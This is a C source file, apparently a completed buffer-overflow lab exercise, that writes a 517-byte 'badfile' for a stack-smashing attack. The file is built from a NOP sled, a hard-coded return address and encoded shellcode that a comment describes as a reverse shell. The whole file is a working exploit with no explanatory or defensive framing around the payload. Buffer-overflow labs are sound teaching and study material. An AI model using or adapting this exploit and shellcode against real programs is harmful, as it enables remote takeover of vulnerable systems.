/* exploit.c */
/* A program that creates a file containing code for launching shell*/
//construct bad file contents ,inject reverse shell into shellcode
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
//280 chars
char shellcode[]= "\xdb\xc5\xb8\xd9\x41\x8c\xef\xd9\x74\x24\xf4\x5a\x2b\xc9"
"\xb1\x12\x31\x42\x17\x03\x42\x17\x83\x1b\x45\x6e\x1a\xaa"
"\x9d\x99\x06\x9f\x62\x35\xa3\x1d\xec\x58\x83\x47\x23\x1a"
"\x77\xde\x0b\x24\xb5\x60\x22\x22\xbc\x08\xbf\xd4\x3c\xc7"
"\xd7\xd6\x40\xc6\x7b\x5e\xa1\x58\xe5\x30\x73\xcb\x59\xb3"
"\xfa\x0a\x50\x34\xae\xa4\x05\x1a\x3c\x5c\xb2\x4b\xed\xfe"
"\x2b\x1d\x12\xac\xf8\x94\x34\xe0\xf4\x6b\x36";
 
//char buffer_add[] = "\xb0\xea\xff\xbf";
char dest_add[] = "\xf0\xeb\xff\xbf"; 

void main(int argc, char **argv)
{
char buffer[517];
FILE *badfile;

/* Initialize buffer with 0x90 (NOP instruction) */
memset(&buffer, 0x90, 517);

/*for (int i=0; i < 13; i++){
  memcpy(buffer+i*4, dest_add, sizeof(dest_add)); 
}*/

/* You need to fill the buffer with appropriate contents here */
memcpy(buffer+19*4, dest_add, sizeof(dest_add));
memcpy(buffer+(4*50-3), shellcode, sizeof(shellcode));

/* Save the contents to the file "badfile" */
badfile = fopen("./badfile", "w");
fwrite(buffer, 517, 1, badfile);
fclose(badfile);
}
